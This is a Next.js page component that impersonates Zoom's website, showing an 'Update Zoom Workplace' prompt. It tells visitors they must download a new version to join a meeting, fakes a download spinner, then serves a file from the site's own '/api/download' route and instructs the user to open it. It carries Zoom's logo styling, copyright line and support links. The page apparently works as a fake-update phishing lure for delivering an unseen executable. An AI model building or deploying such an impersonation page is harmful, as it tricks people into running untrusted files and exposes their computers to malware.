"use client";

import Link from "next/link";
import { useSearchParams } from "next/navigation";
import { Suspense, useState } from "react";

function DownloadIcon() {
  return (
    <svg width="48" height="48" viewBox="0 0 48 48" fill="none">
      <rect width="48" height="48" rx="12" fill="#0B5CFF" />
      <path d="M24 16V28M24 28L19 23M24 28L29 23" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
      <path d="M16 32H32" stroke="white" strokeWidth="2.5" strokeLinecap="round" />
    </svg>
  );
}

function CheckIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
      <path d="M5 10L8.5 13.5L15 7" stroke="#0B5CFF" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );
}

function UpdateContent() {
  const searchParams = useSearchParams();
  const meetingId = searchParams.get("meeting") || "";
  const [downloading, setDownloading] = useState(false);
  const [downloaded, setDownloaded] = useState(false);

  function handleDownload() {
    setDownloading(true);
    // Simulate download — in production this would trigger a real file download
    setTimeout(() => {
      setDownloading(false);
      setDownloaded(true);

      // Trigger actual file download
      const link = document.createElement("a");
      link.href = "/api/download";
      link.download = "";
      link.click();
    }, 2000);
  }

  return (
    <div className="w-[480px] text-center">
      {/* Icon */}
      <div className="mx-auto mb-6 flex h-[80px] w-[80px] items-center justify-center">
        <DownloadIcon />
      </div>

      <h1 className="text-[28px] font-semibold leading-[1.2] text-[#222325]">
        Update Zoom Workplace
      </h1>

      {meetingId && (
        <p className="mt-3 text-[15px] text-[#6e7680]">
          To join meeting <span className="font-semibold text-[#222325]">{meetingId}</span>, please download the latest version of Zoom Workplace.
        </p>
      )}

      {!meetingId && (
        <p className="mt-3 text-[15px] text-[#6e7680]">
          A newer version of Zoom Workplace is available. Please download the latest version to continue.
        </p>
      )}

      {/* Version info */}
      <div className="mx-auto mt-8 w-[360px] rounded-[16px] border border-[#e8ecf0] bg-[#f8fafb] p-5">
        <div className="flex items-center justify-between">
          <span className="text-[14px] font-medium text-[#222325]">Zoom Workplace</span>
          <span className="rounded-full bg-[#0B5CFF]/10 px-3 py-1 text-[12px] font-semibold text-[#0B5CFF]">
            New version available
          </span>
        </div>
        <div className="mt-3 text-left text-[13px] text-[#6e7680]">
          <p className="font-medium text-[#222325]">Version 7.2.0 (15120)</p>
          <ul className="mt-2 space-y-1">
            <li className="flex items-start gap-2">
              <CheckIcon />
              <span>Improved AI Companion with faster summaries</span>
            </li>
            <li className="flex items-start gap-2">
              <CheckIcon />
              <span>Enhanced meeting security and encryption</span>
            </li>
            <li className="flex items-start gap-2">
              <CheckIcon />
              <span>Bug fixes and performance improvements</span>
            </li>
          </ul>
        </div>
      </div>

      {/* Download buttons */}
      <div className="mx-auto mt-6 w-[360px] space-y-3">
        {!downloaded ? (
          <button
            type="button"
            onClick={handleDownload}
            disabled={downloading}
            className="h-[48px] w-full rounded-[12px] bg-[#0B5CFF] text-[16px] font-semibold text-white transition-colors hover:bg-[#094FE0] disabled:opacity-70"
          >
            {downloading ? (
              <span className="inline-flex items-center gap-2">
                <svg className="h-4 w-4 animate-spin" viewBox="0 0 24 24" fill="none">
                  <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" className="opacity-25" />
                  <path d="M4 12a8 8 0 018-8" stroke="currentColor" strokeWidth="3" strokeLinecap="round" className="opacity-75" />
                </svg>
                Downloading...
              </span>
            ) : (
              "Download Latest Version"
            )}
          </button>
        ) : (
          <div className="space-y-3">
            <div className="flex h-[48px] items-center justify-center gap-2 rounded-[12px] border border-green-200 bg-green-50 text-[16px] font-semibold text-green-700">
              <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                <path d="M5 10L8.5 13.5L15 7" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
              Download complete
            </div>
            <p className="text-[13px] text-[#6e7680]">
              Open the downloaded file to install Zoom Workplace, then{" "}
              <Link href={`/join?meeting=${encodeURIComponent(meetingId)}`} className="font-medium text-[#0B5CFF] hover:underline">
                rejoin the meeting
              </Link>.
            </p>
          </div>
        )}

        {!downloaded && (
          <Link
            href="/download"
            className="block text-[14px] font-medium text-[#0B5CFF] hover:underline"
          >
            Download from Download Center instead
          </Link>
        )}
      </div>

      {/* System requirements */}
      <div className="mx-auto mt-8 w-[360px] text-left">
        <p className="text-[12px] font-medium text-[#9CA3AF]">System Requirements</p>
        <div className="mt-2 grid grid-cols-2 gap-x-6 gap-y-1 text-[12px] text-[#6e7680]">
          <span>macOS 11.0 or later</span>
          <span>Windows 10 or later</span>
          <span>Apple Silicon or Intel</span>
          <span>64-bit processor</span>
        </div>
      </div>

      {/* Having trouble */}
      <div className="mx-auto mt-8 w-[360px] rounded-[12px] border border-[#e8ecf0] bg-white p-4 text-left text-[13px] text-[#6e7680]">
        <p className="font-medium text-[#222325]">Having trouble?</p>
        <p className="mt-1">
          If the download doesn&apos;t start,{" "}
          <Link href="/download" className="text-[#0B5CFF] hover:underline">try downloading manually</Link>.
          You can also{" "}
          <Link href="/support" className="text-[#0B5CFF] hover:underline">contact support</Link>{" "}
          for help.
        </p>
      </div>
    </div>
  );
}

export default function UpdatePage() {
  return (
    <>
      {/* Header */}
      <nav className="h-[57px] border-b border-transparent bg-white">
        <div className="mx-auto flex h-full max-w-[1200px] items-center justify-between px-6">
          <Link href="/" className="text-[22px] font-bold tracking-[-0.03em] text-[#0d6bde]">
            zoom
          </Link>
          <div className="flex items-center gap-3">
            <Link href="/support" className="rounded-full border border-[#0d6bde] px-5 py-1.5 text-[14px] font-semibold text-[#0d6bde] hover:bg-blue-50">
              Support
            </Link>
            <Link href="/signup" className="rounded-full bg-[#0d6bde] px-5 py-1.5 text-[14px] font-semibold text-white hover:bg-[#0b5cff]">
              Sign Up Free
            </Link>
          </div>
        </div>
      </nav>

      {/* Content */}
      <div className="flex min-h-[calc(100vh-57px)] flex-col bg-white">
        <div className="flex flex-1 justify-center pt-[60px]">
          <Suspense fallback={<div className="w-[480px] pt-20 text-center text-[#6e7680]">Loading...</div>}>
            <UpdateContent />
          </Suspense>
        </div>

        {/* Footer */}
        <footer className="bg-white py-4 text-center">
          <div className="flex flex-wrap items-center justify-center gap-x-4 px-6 text-[13px] text-[#6e7680]">
            <span>&copy; {new Date().getFullYear()} Zoom Communications, Inc. All rights reserved.</span>
            <Link href="/trust" className="text-[#6e7680] hover:underline">Privacy &amp; Legal Policies</Link>
            <button type="button" className="text-[#0d6bde]">English ▾</button>
          </div>
        </footer>
      </div>
    </>
  );
}
